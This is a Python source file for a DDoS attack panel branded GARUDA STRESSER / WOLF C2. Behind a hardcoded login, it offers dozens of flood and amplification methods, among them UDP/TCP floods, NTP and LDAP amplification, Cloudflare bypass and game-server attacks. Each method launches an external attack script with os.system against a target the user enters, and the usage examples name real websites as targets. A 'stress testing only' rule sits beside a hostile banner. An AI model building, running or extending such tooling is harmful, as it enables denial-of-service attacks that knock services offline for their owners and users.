import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()


def tools():
    clear()
    print(f'''
\033[37mreverseip► Chek url for ip
\033[37mdns ► Chek dns🔥
\033[37masn-lookup ► asn lookup🔥
\033[37msubnet-lookup  ►  Subnet lookup🔥
\033[37mreverse-dns ►  Reverse dn🔥
''')

def rules():
    clear()
    print(f'''
                1. Hanya tujuan pengetesan               
                2. Only attack stress testing servers         
                3. Don't skid the panel                       
                4. The creator does not do any harm           
                
''')
    
def layer7():
    clear()
    print("""
  ▄████  ▄▄▄       ██▀███    ██████ ▓█████  ▄████▄  
 ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒░ ▓██▄   ▒███   ▒▓█    ▄ 
░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒▒██████▒▒░▒████▒▒ ▓███▀ ░
 ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
  ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
░ ░   ░   ░   ▒     ░░   ░ ░  ░  ░     ░   ░        
      ░       ░  ░   ░           ░     ░  ░░ ░      
                                           ░        
                  
                  \033[35mMy Team: GARUDA SECURITY
      \033[37mWelcome: Tools DOS By GarudaSecurity & Reroatzx - 777
          \033[34mMessage Me: FUCK YOU WEBSITE🖕🖕
       ]-------------------------------------[

[ LAYER - 4 ] 

– .udp : udp attack with ip
– .tcp : tcp attack with ip
– .nfo-killer : nfo-killer attack with ip
– .udpbypass : udpbypass attack with ip
– .std : attack std
– .home : home attack
– .destroy : destroy attack tools
– .god : god attack
– .stdv2 : std attack
– .flux : flux attack
– .ovh-amp : Games attack tools
– .minecraft : attack server Minecraft
– .samp : Attack server samp
– .ldap : server Attack games
– .Max : Max attack power 100Gbps

[ LAYER - 7 ]

– .http-raw : Attack form raw
– .http-socket : Attack socket websites
– .http-random-v2
– .httpflood : flood attack
– .overflow : Attack form raw
– .cf-bypass : CLOUDFLARE bypass
– .uambypass : CLOUDFLARE UAM BYPAS
– .hyper : hyper attack
– .https-spoof : https spoof attack
– .cf-pro : cloud flare attack pro
– .crash : Attack for crash
– .cf-socket : cloudflare attack methode socket
– .new : http new v2
– .stress : Attack form raw
– .sky : sky attack
– .wolf-panel : run wolf-panel v1.0
– .garuda-ddos : Attack form raw
– .Dann : Attack form Dandier tools
– .tcp-killer : Killer tcp attack
– .CFSTRONG : Attack very strongly
– .Null : Attack with url and port 443 80
– .Nuke : Attack power max🖕
– .Flood : http flood attack test🖕💀
""")

def exit_program():
    clear()
    sys.exit()
    print('''Sedang keluar mohon tunggu ya''')


def menu():
    sys.stdout.write(f"         \x1b]2; GARUDA C2 PANEL--> Stars: [{bots}] | Online Users: [1] | Methods: [33] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("""

  ▄████  ▄▄▄       ██▀███    ██████ ▓█████  ▄████▄  
 ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒░ ▓██▄   ▒███   ▒▓█    ▄ 
░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒▒██████▒▒░▒████▒▒ ▓███▀ ░
 ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
  ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
░ ░   ░   ░   ▒     ░░   ░ ░  ░  ░     ░   ░        
      ░       ░  ░   ░           ░     ░  ░░ ░      
                                           ░        
 \033[38mWelcome - WOLF [ C2 ].             
                      
                  \033[35mMy Team: GARUDA SECURITY
      \033[37mWelcome: Tools DOS By GarudaSecurity & Reroatzx - 777
          \033[34mMessage Me: FUCK YOU WEBSITE🖕🖕
""")

def main():
    menu()
    while(True):
        cnc = input('''\033[0;30;45m?┌──(root㉿WOLF)-[/ATTACK]
└─#\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
        if cnc == "method" or cnc == "methods" or cnc == "METHODS" or cnc == "METHOD":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "exit" or cnc == "ext" or cnc == "EXIT" or cnc == "Exit":
            exit_program()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')
               
        elif "Flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                methode = cnc.split()[3]
                time = cnc.split()[4]
                header = cnc.split()[5]
                os.system(f'go run httpflood.go {url} {threads} {methode} {time} {header}')
            except IndexError:
                print('Example: Flood https://bojep.com/ 5000 get 120 ua.txt')
                print('example²: Flood <url> <threads> <get/post> <time> <ua.txt>')
                
                
        elif "Nuke" in cnc:
            try:
               url = cnc.split()[1]
               time = cnc.split()[2]
               threads = cnc.split()[3]
               proxy = cnc.split()[4]
               rps = cnc.split()[5]
               os.system(f'node Nuke.js {url} {time} {threads} {proxy} {rps}')
            except IndexError:
                print('Example Nuke http://bokep.com/ 120 20000 proxies.txt 1000')
                print('Example² Nuke <url> <time> <threads> <proxies.txt> <rps>')
             
        elif "CFSTRONG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                method = cnc.split()[4]
                proxy = cnc.split()[5]
                requests = cnc.split()[6]
                os.system(f'node CFSTRONG.js {url} {time} {threads} {method} {proxy} {request}')
            except IndexError:
                print('Usage: CFSTRONG https://yandex.com/ 120 15000 GET/POST proxies.txt 500')
                print('Example CFSTRONG <url> <time> <threads> <methode> <proxy> <request>')
        
        elif "tcp-killer" in cnc:
            try:
                url = cnc.split()[1]
                proxy = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node tcpkiller.js {url} {proxy} {time}')
            except IndexError:
                print('Usage: tcp-killer https://xnxx.com/ proxies.txt 120')
                print('Example: tcp-killer <url> <proxy> <time>')
                
        elif "Null" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                methode = cnc.split()[3]
                time = cnc.split()[4]
                headers = cnc.split()[5]
                os.system(f'go run Null.go {url} {threads} {methode} {time} {headers}')
            except IndexError:
                print('Example Usage: Null https://bokep.com/ 60000 get 120 ua.txt')
                print('Exanple: Null <url> <Threads> <get/post> <time> <ua.txt>')
            
        elif "Max" in cnc:
              
                os.system(f'python3 full.py')
                
        elif "Dann" in cnc:
        
                os.system(f'python3 main.py')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                ascii_vro()
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                ascii_vro()
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                ascii_vro()
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                ascii_vro()
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                ascii_vro()
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                ascii_vro()
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "sky" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                request = cnc.split()[3]
                threads = cnc.split()[4]
                proxy = cnc.split()[5]
                ascii_vro()
                os.system(f'node skynet.js {target} {time} {request} {threads} {proxy}')
            except IndexError:
                print('lihat cara pakai nya skynet')
                print('node skynet.js https://target.com 120 15 2000 proxies.txt')
                
        elif "wolf-panel" in cnc:
        
                os.system(f'python3 GARUDA.py')
                
        elif "garuda-ddos" in cnc:
        
                os.system(f'python3 main.py')
                                 
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                ascii_vro()
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                ascii_vro()
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
        elif "new" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                proxy = cnc.split()[4]
                req = cnc.split()[5]
                ascii_vro()
                os.system(f'node new.js {url} {time} {threads} {proxy} {req}')
            except IndexError:
                print('Example: new https://target.com/ 60 500 proxies.txt 300')
                print('Di ubah saja yang di atas 500 itu threads nya 60 itu time dan 300 itu request nya')
                
        elif "spurt" in cnc:
            try:
               url = cnc.split
               ascii_vro()
               os.system(f'./spurt --hostname {url}')
            except IndexError:
               print('Example: spurt https://target.com/')
                
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
            
               
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
                
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                ascii_vro()
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')
                
        elif "http-random-v2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node HTTP-RANDOM.js {url} {time}')
            except IndexError:
                print('Usage: http-random-v2 <url> <time>')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                ascii_vro()
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node BYPASS.js {url} {time}')
            except IndexError:
                print('Usage: cf-bypass <url> <time>')
                print('Example: cf-bypass http://example.com 60')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                ascii_vro()
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                ascii_vro()
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                ascii_vro()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                ascii_vro()
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')
                
#TOOLS

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif "reverse-dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')

        elif "help" in cnc:
            print(f'''
METHODS ► SHOW ALL METHODS
RULES   ► RULES PANEL
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
Exit ► Keluar dari tools
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "GARUDA"
    passwd = "GARUDA"
    username = input(" 🚀 Username: ")
    password = getpass.getpass(prompt='🚀 Password: ')
    if username != user or password != passwd:
        print("")
        print("🚀 PASS NYA SALAH COBA ULANGI...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚀 Welcome to GARUDA STRESSER!")
        main()

login()